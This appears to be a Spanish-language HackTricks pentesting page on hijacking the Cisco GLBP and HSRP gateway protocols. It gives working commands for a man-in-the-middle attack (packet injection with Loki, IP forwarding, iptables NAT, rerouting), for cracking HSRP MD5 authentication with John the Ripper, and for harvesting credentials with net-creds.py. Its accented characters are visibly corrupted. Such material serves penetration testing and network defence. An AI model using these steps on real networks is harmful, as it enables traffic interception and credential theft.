# Ataques GLBP & HSRP

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


## Visi칩n General del Secuestro de FHRP

### Entendiendo FHRP
First Hop Redundancy Protocol (FHRP) es un conjunto de protocolos que asegura la resiliencia de la red combinando m칰ltiples routers f칤sicos en una 칰nica entidad virtual. Esto mejora la distribuci칩n de carga y la tolerancia a fallos. Cisco Systems introdujo dos protocolos FHRP notables: GLBP y HSRP.

### Detalles del Protocolo GLBP
Desarrollado por Cisco, GLBP (Gateway Load Balancing Protocol) opera sobre la pila TCP/IP, utilizando UDP en el puerto 3222 para la comunicaci칩n. Los routers dentro de un grupo GLBP env칤an paquetes "hello" cada 3 segundos. La ausencia de estos paquetes durante 10 segundos de un router indica su fallo. Sin embargo, estos ajustes de temporizador son configurables.

### Operaci칩n y Balanceo de Carga de GLBP
GLBP permite compartir carga a trav칠s de m칰ltiples routers utilizando una 칰nica direcci칩n IP virtual y varias direcciones MAC virtuales. Cada router en el grupo participa en el reenv칤o de paquetes. GLBP se diferencia de HSRP/VRRP al ofrecer un verdadero balanceo de carga, que incluye:

- **Dependiente del Host:** Asegura que un host reciba la misma direcci칩n MAC de AVF, preservando las configuraciones de NAT.
- **Round-Robin:** El modo predeterminado donde las direcciones MAC de AVF se distribuyen alternativamente.
- **Round-Robin basado en Peso:** Balancea la carga basado en una m칠trica de "Peso" predefinida.

### Roles y Terminolog칤a del Dominio GLBP
- **AVG (Active Virtual Gateway):** El router principal, distribuyendo direcciones MAC a otros routers.
- **AVF (Active Virtual Forwarder):** Un router que maneja el tr치fico de la red.
- **Prioridad GLBP:** Decide el AVG, con un valor predeterminado de 100 y un rango de 1 a 255.
- **Peso GLBP:** Indica el nivel de carga del router, ajustable manualmente o a trav칠s de Object Tracking.
- **Direcci칩n IP Virtual GLBP:** Act칰a como la puerta de enlace predeterminada para los dispositivos conectados.

Para la comunicaci칩n, GLBP utiliza la direcci칩n multicast reservada 224.0.0.102 y el puerto UDP 3222. Los paquetes "hello" se env칤an cada 3 segundos, y los routers se marcan como "muertos" si no se recibe un paquete dentro de 10 segundos.

### Mecanismo de Ataque GLBP
Un atacante puede convertirse en el router principal enviando un paquete GLBP con el valor de prioridad m치s alto (255). Esto puede llevar a ataques de DoS o MITM, permitiendo la intercepci칩n o redirecci칩n del tr치fico.

### Ejecutando un Ataque GLBP con Loki
[Loki](https://github.com/raizo62/loki_on_kali) puede realizar un ataque GLBP inyectando un paquete con la prioridad y el peso establecidos en 255. Los pasos previos al ataque implican recopilar informaci칩n como la direcci칩n IP virtual, la presencia de autenticaci칩n y los valores de prioridad del router utilizando herramientas como Wireshark.

Pasos del Ataque:
1. Cambiar a modo promiscuo y habilitar el reenv칤o de IP.
2. Identificar el router objetivo y recuperar su IP.
3. Generar un ARP Gratuito.
4. Inyectar un paquete GLBP malicioso, suplantando al AVG.
5. Asignar una direcci칩n IP secundaria a la interfaz de red del atacante, reflejando la direcci칩n IP virtual GLBP.
6. Implementar SNAT para una visibilidad completa del tr치fico.
7. Ajustar el enrutamiento para asegurar el acceso continuo a internet a trav칠s del router AVG original.

Siguiendo estos pasos, el atacante se posiciona como un "hombre en el medio", capaz de interceptar y analizar el tr치fico de la red, incluyendo datos no cifrados o sensibles.

Para demostraci칩n, aqu칤 est치n los fragmentos de comandos requeridos:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
### Explicaci칩n Pasiva del Secuestro de HSRP con Detalles de Comandos

#### Visi칩n General de HSRP (Protocolo de Redundancia/Router de Reserva Activa)
HSRP es un protocolo propietario de Cisco dise침ado para la redundancia de puertas de enlace de red. Permite configurar m칰ltiples routers f칤sicos en una sola unidad l칩gica con una direcci칩n IP compartida. Esta unidad l칩gica es gestionada por un router principal responsable de dirigir el tr치fico. A diferencia de GLBP, que utiliza m칠tricas como prioridad y peso para el balanceo de carga, HSRP depende de un 칰nico router activo para la gesti칩n del tr치fico.

#### Roles y Terminolog칤a en HSRP
- **Router Activo HSRP**: El dispositivo que act칰a como puerta de enlace, gestionando el flujo de tr치fico.
- **Router en Espera HSRP**: Un router de respaldo, listo para tomar el control si el router activo falla.
- **Grupo HSRP**: Un conjunto de routers que colaboran para formar un 칰nico router virtual resiliente.
- **Direcci칩n MAC HSRP**: Una direcci칩n MAC virtual asignada al router l칩gico en la configuraci칩n de HSRP.
- **Direcci칩n IP Virtual HSRP**: La direcci칩n IP virtual del grupo HSRP, que act칰a como puerta de enlace predeterminada para los dispositivos conectados.

#### Versiones de HSRP
HSRP viene en dos versiones, HSRPv1 y HSRPv2, que se diferencian principalmente en la capacidad del grupo, el uso de IP multicast y la estructura de la direcci칩n MAC virtual. El protocolo utiliza direcciones IP multicast espec칤ficas para el intercambio de informaci칩n de servicio, con paquetes Hello enviados cada 3 segundos. Se presume que un router est치 inactivo si no se recibe ning칰n paquete en un intervalo de 10 segundos.

#### Mecanismo de Ataque HSRP
Los ataques HSRP implican tomar por la fuerza el rol del Router Activo inyectando un valor de prioridad m치xima. Esto puede llevar a un ataque Man-In-The-Middle (MITM). Los pasos previos esenciales al ataque incluyen la recopilaci칩n de datos sobre la configuraci칩n de HSRP, lo cual se puede hacer utilizando Wireshark para el an치lisis de tr치fico.

#### Pasos para Eludir la Autenticaci칩n HSRP
1. Guardar el tr치fico de red que contiene datos HSRP como un archivo .pcap.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. Extraer hashes MD5 del archivo .pcap utilizando hsrp2john.py.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. Romper los hashes MD5 utilizando John the Ripper.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Ejecuci칩n de Inyecci칩n HSRP con Loki**

1. Iniciar Loki para identificar anuncios HSRP.
2. Configurar la interfaz de red en modo promiscuo y habilitar el reenv칤o de IP.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Utilizar Loki para apuntar al router espec칤fico, introducir la contrase침a HSRP descifrada y realizar las configuraciones necesarias para suplantar al Router Activo.
4. Despu칠s de obtener el rol de Router Activo, configurar la interfaz de red y las tablas IP para interceptar el tr치fico leg칤timo.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Modificar la tabla de enrutamiento para dirigir el tr치fico a trav칠s del antiguo Router Activo.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Utilizar net-creds.py o una utilidad similar para capturar credenciales del tr치fico interceptado.
```shell
sudo python2 net-creds.py -i eth0
```

Ejecutar estos pasos coloca al atacante en una posici칩n para interceptar y manipular el tr치fico, de manera similar al procedimiento para el secuestro de GLBP. Esto resalta la vulnerabilidad en protocolos de redundancia como HSRP y la necesidad de medidas de seguridad robustas.


# Referencias
- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
